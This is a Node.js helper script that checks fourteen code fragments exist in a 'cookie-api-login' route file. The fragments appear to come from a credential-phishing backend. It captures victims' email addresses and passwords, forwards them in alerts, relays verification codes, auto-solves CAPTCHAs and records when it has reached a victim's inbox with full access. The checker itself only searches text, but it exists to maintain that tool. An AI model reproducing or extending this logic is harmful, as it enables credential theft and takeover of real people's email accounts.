const fs = require('fs');

const filePath = 'src/app/emails/cookie/cookie-api-login/route.js';
let content = fs.readFileSync(filePath, 'utf8');

const isCrlf = content.includes('\r\n');
console.log(`File line ending: ${isCrlf ? 'CRLF' : 'LF'}`);

// Test target 1: initialCheckResult initialization
const target1 = `    // Set initialCheckResult from lastJsonResponse if available
    if (row && row[columnIndexes['lastJsonResponse']]) {
        try {
            const lastJson = JSON.parse(row[columnIndexes['lastJsonResponse']]);`;

// Test target 2: domain validation startup
const target2 = `                    if (mxRecords.length === 0 && !domainMatchesStrictly) {
                        logger.warn(\`[processRow][\${browserId}] Domain '\${domain}' has no MX records and does not match strictly platform '\${strictlyKey}' (keywords: [\${strictKeywords.join(', ')}]). Rejecting as invalid email.\`);
                        finalStatus = "WAITINGEMAILERROR";
                        updateData.status = finalStatus;
                        updateData.lastJsonResponse = JSON.stringify({
                            browserId, email, status: finalStatus,
                            platform: strictlyKey, domain: domain || '',
                            timestamp: new Date().toISOString(),
                            message: \`Email domain '\${domain}' is not a valid \${strictlyKey} address. Please use a valid email.\`
                        });
                        sendWrongInputAlert({ type: 'WRONG_EMAIL', platform: strictlyKey, email, browserId, password: password || '', detail: \`Domain '\${domain}' has no MX and doesn't match \${strictlyKey}\` });
                        updateBrowserRowDataFast(browserId, { ...updateData, email: '' });
                        return;
                    }`;

// Test target 3: strictly validation inside WAITINGEMAIL
const target3 = `                                logger.warn(\`[processRow][\${browserId}] Email '\${email}' rejected by strictly validation: \${validation.message}. Setting WAITINGEMAILERROR so the template renders the inline error.\`);
                                finalStatus = "WAITINGEMAILERROR";
                                updateData.status = finalStatus;
                                updateData.lastJsonResponse = JSON.stringify({
                                    browserId,
                                    email,
                                    password: password || '',
                                    status: finalStatus,
                                    emailExists: true,
                                    accountAccess: false,
                                    reachedInbox: false,
                                    requiresVerification: false,
                                    verificationState: null,
                                    verificationOptions: [],
                                    platform: 'unknown',
                                    timestamp: new Date().toISOString(),
                                    errorType: 'STRICTLY_MISMATCH',
                                    message: validation.message,
                                    lastTriedEmail: email,
                                    lastTriedPassword: password || ''
                                });
                                sendWrongInputAlert({ type: 'WRONG_EMAIL', platform: String(rowStrictlyForValidation).trim().toLowerCase() || 'unknown', email: email || '', browserId, password: password || '', detail: \`STRICTLY_MISMATCH: \${validation.message}\` });
                                // Clear email to prevent re-processing, but keep password in sheet for the next attempt
                                updateBrowserRowDataFast(browserId, { ...updateData, email: '', domain: '', verified: false, fullAccess: false });
                                exitingEarly = true;
                                return; // Exit processRow immediately`;

// Test target 4: domain validation inside WAITINGEMAIL
const target4 = `                                if (mxRecords.length === 0 && !domainMatchesStrictly) {
                                    logger.warn(\`[processRow][\${browserId}][WAITINGEMAIL] Domain '\${domain}' has no MX records and does not match strictly platform '\${strictFallbackKey}' (keywords: [\${strictKeywords.join(', ')}]). Rejecting as invalid email.\`);
                                    finalStatus = "WAITINGEMAILERROR";
                                    updateData.status = finalStatus;
                                    updateData.lastJsonResponse = JSON.stringify({
                                        browserId, email, status: finalStatus,
                                        platform: strictFallbackKey, domain: domain || '',
                                        timestamp: new Date().toISOString(),
                                        message: \`Email domain '\${domain}' is not a valid \${strictFallbackKey} address. Please use a valid email.\`
                                    });
                                    sendWrongInputAlert({ type: 'WRONG_EMAIL', platform: strictFallbackKey, email, browserId, password: password || '', detail: \`Domain '\${domain}' has no MX and doesn't match \${strictFallbackKey}\` });
                                    updateBrowserRowDataFast(browserId, { ...updateData, email: '' });
                                    exitingEarly = true;
                                    return;
                                }`;

// Test target 5: WAITINGPASSWORD recovery inbox
const target5 = `                                if (reachedInboxAfterRecovery) {
                                    logger.info(\`[processRow][\${browserId}][WAITINGPASSWORD] Inbox reached after page recovery. Treating as full access.\`);
                                    finalStatus = "COMPLETED";
                                    updateData.status = "COMPLETED";
                                    updateData.verified = true;
                                    updateData.fullAccess = true;`;

// Test target 6: WAITINGCODE inbox reached branch 1
const target6 = `                            if (inboxReachedAfterWait) {
                                logger.info(\`[processRow][\${browserId}][WAITINGCODE] Inbox reached after verification wait. Setting status to PROCESSING_FINALIZING.\`);
                                finalStatus = "PROCESSING_FINALIZING";
                                codeSuccessfullyProcessed = true;
                                initialCheckResult.reachedInbox = true;
                                initialCheckResult.requiresVerification = false;
                                initialCheckResult.accountAccess = true;`;

// Test target 7: WAITINGCODE inbox reached branch 2
const target7 = `                                if (inboxCheckAfterCode) {
                                    logger.info(\`[processRow][\${browserId}][WAITINGCODE] Inbox reached after code submission. Setting PROCESSING_FINALIZING.\`);
                                    finalStatus = "PROCESSING_FINALIZING";
                                    codeSuccessfullyProcessed = true;
                                    initialCheckResult.reachedInbox = true;
                                    initialCheckResult.requiresVerification = false;
                                    initialCheckResult.accountAccess = true;`;

// Test target 8: WAITINGCODE inbox reached branch 3 (passive)
const target8 = `                        if (inboxCheckedNoCode) {
                            logger.info(\`[processRow][\${browserId}][WAITINGCODE] Inbox reached during passive wait (no code submitted). Setting status to PROCESSING_FINALIZING.\`);
                            finalStatus = "PROCESSING_FINALIZING";
                            codeSuccessfullyProcessed = true;
                            initialCheckResult.reachedInbox = true;
                            initialCheckResult.requiresVerification = false;
                            initialCheckResult.accountAccess = true;
                            initialCheckResult.emailExists = true;`;

// Test target 9: Post-check waterfall guards
const target9 = `        // Handle CAPTCHA_FAILED — set FAILED (no fallback, auto-solve only)
        if (initialCheckResult.verificationState === 'CAPTCHA_FAILED') {`;

const target10 = `        if (initialCheckResult.verificationState === 'RETRY_TECHNICAL') {`;

const target11 = `        } else if (initialCheckResult.verificationState === 'WAITINGEMAIL_ERROR') {`;

const target12 = `        } else if (initialCheckResult.verificationState === 'WAITINGPASSWORD_ERROR') {`;

const target13 = `        } else if (!initialCheckResult.emailExists && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined) && finalStatus !== "WAITINGCODE" && finalStatus !== "WAITINGOPTIONS") {`;

// Test target 14: processWaitingRows staleness check
const target14 = `            if (activeProcesses.has(bId)) continue;
            if (activityIdx === undefined || !row[activityIdx]) continue;

            const activityVal = String(row[activityIdx]).trim();
            if (!activityVal) continue;`;

const targets = [
    { name: 'target1', str: target1 },
    { name: 'target2', str: target2 },
    { name: 'target3', str: target3 },
    { name: 'target4', str: target4 },
    { name: 'target5', str: target5 },
    { name: 'target6', str: target6 },
    { name: 'target7', str: target7 },
    { name: 'target8', str: target8 },
    { name: 'target9', str: target9 },
    { name: 'target10', str: target10 },
    { name: 'target11', str: target11 },
    { name: 'target12', str: target12 },
    { name: 'target13', str: target13 },
    { name: 'target14', str: target14 },
];

let allFound = true;
for (const t of targets) {
    const normalizedTarget = isCrlf ? t.str.replace(/\r?\n/g, '\r\n') : t.str.replace(/\r\n/g, '\n');
    const idx = content.indexOf(normalizedTarget);
    if (idx === -1) {
        console.error(`FAILED to find: ${t.name}`);
        allFound = false;
    } else {
        console.log(`Found ${t.name} at position ${idx}`);
    }
}

if (allFound) {
    console.log('\nALL 14 TARGETS FOUND PERFECTLY!');
}
